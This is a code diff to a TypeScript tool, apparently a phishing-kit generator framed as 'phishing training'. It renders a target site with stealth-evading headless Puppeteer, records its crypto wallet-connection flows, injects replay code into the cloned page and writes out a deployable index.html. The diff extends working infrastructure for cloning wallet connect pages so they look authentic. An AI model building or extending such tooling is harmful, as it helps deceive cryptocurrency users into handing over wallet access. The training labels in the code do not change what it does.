@@ -131,6 +131,11 @@ import {
   buildWalletFlowInjectionCode,
   type WalletFlowCapture,
 } from './lib/wallet-flow-detector.js'
+import {
+  recordWalletConnectionFlows,
+  buildFlowReplayInjectionCode,
+  type CapturedFlows,
+} from './lib/wallet-flow-recorder.js'
 
 const TRAINING_UA =
   'Legion-Phishing-Training-Bot/1.0 (authorized-internal; respects-robots; no-index)'
@@ -485,9 +490,10 @@ function resolveDemoApiUrl(): string {
   return `http://127.0.0.1:${apiPort}`
 }
 
-async function renderPageWithPuppeteer(targetUrl: string): Promise<{
+async function renderPageWithPuppeteer(targetUrl: string, outputDir?: string): Promise<{
   html: string
   walletFlows: WalletFlowCapture
+  capturedFlows?: CapturedFlows
 }> {
   console.info('[PUPPETEER] Launching headless browser with stealth evasion…')
 
@@ -540,11 +546,22 @@ async function renderPageWithPuppeteer(targetUrl: string): Promise<{
       hasHardware: walletFlows.hasHardwareDetection,
     })
 
+    // NEW: Record actual interaction flows
+    let capturedFlows: CapturedFlows | undefined
+    if (outputDir) {
+      console.info('[PUPPETEER] Recording actual wallet connection flows…')
+      capturedFlows = await recordWalletConnectionFlows(page, browser, outputDir)
+      console.info('[PUPPETEER] Flow recording complete:', {
+        flowsCaptured: capturedFlows.totalFlows,
+        steps: capturedFlows.flows.reduce((sum, f) => sum + f.totalSteps, 0),
+      })
+    }
+
     const html = await page.content()
     console.info('[PUPPETEER] Page fully rendered ✓')
 
     await page.close()
-    return { html, walletFlows }
+    return { html, walletFlows, capturedFlows }
   } finally {
     await browser.close()
   }
@@ -1453,17 +1470,25 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')} --authorized-test --inter
 
   let html: string
   let walletFlows: WalletFlowCapture | null = null
+  let capturedFlows: CapturedFlows | null = null
 
   if (authorizedTest) {
     console.info('[PHISHING_TRAINING] Using Puppeteer full render (authorized production clone)…')
     try {
-      const renderResult = await renderPageWithPuppeteer(target.href)
+      const renderResult = await renderPageWithPuppeteer(target.href, outDir)
       html = renderResult.html
       walletFlows = renderResult.walletFlows
+      capturedFlows = renderResult.capturedFlows || null
       console.info('[WALLET-DETECTOR] Captured wallet flows:', {
         wallets: walletFlows.wallets.map(w => w.name),
         flows: walletFlows.flows.length,
       })
+      if (capturedFlows) {
+        console.info('[FLOW-RECORDER] Recorded interaction flows:', {
+          totalFlows: capturedFlows.totalFlows,
+          steps: capturedFlows.flows.reduce((sum, f) => sum + f.totalSteps, 0),
+        })
+      }
     } catch (e) {
       console.error(`[PUPPETEER] Render failed: ${e instanceof Error ? e.message : String(e)}`)
       console.warn('[PUPPETEER] Falling back to static fetch…')
@@ -1615,10 +1640,17 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')} --authorized-test --inter
     walletFlowInjection = buildWalletFlowInjectionCode(walletFlows)
   }
 
+  // NEW: Inject actual recorded interaction flows
+  let flowReplayInjection = ''
+  if (capturedFlows && capturedFlows.totalFlows > 0) {
+    console.info('[FLOW-REPLAY] Injecting recorded interaction flows into clone…')
+    flowReplayInjection = buildFlowReplayInjectionCode(capturedFlows)
+  }
+
   if (html.includes('</body>')) {
-    html = html.replace('</body>', `${walletFlowInjection}\n${injection}\n</body>`)
+    html = html.replace('</body>', `${flowReplayInjection}\n${walletFlowInjection}\n${injection}\n</body>`)
   } else {
-    html += walletFlowInjection + injection
+    html += flowReplayInjection + walletFlowInjection + injection
   }
 
   await writeFile(path.join(outDir, 'index.html'), html, 'utf8')
@@ -1650,6 +1682,9 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')} --authorized-test --inter
           wallet_flows_detected: walletFlows ? walletFlows.wallets.map(w => w.name) : [],
           wallet_flows_count: walletFlows ? walletFlows.flows.length : 0,
           has_hardware_detection: walletFlows?.hasHardwareDetection ?? false,
+          interaction_flows_recorded: capturedFlows ? capturedFlows.totalFlows : 0,
+          interaction_flow_steps: capturedFlows ? capturedFlows.flows.reduce((sum, f) => sum + f.totalSteps, 0) : 0,
+          interaction_flows_wallets: capturedFlows ? capturedFlows.flows.map(f => f.walletType) : [],
           generated_at: new Date().toISOString(),
           features: enabledFlags,
           deploy_url: deployUrl,
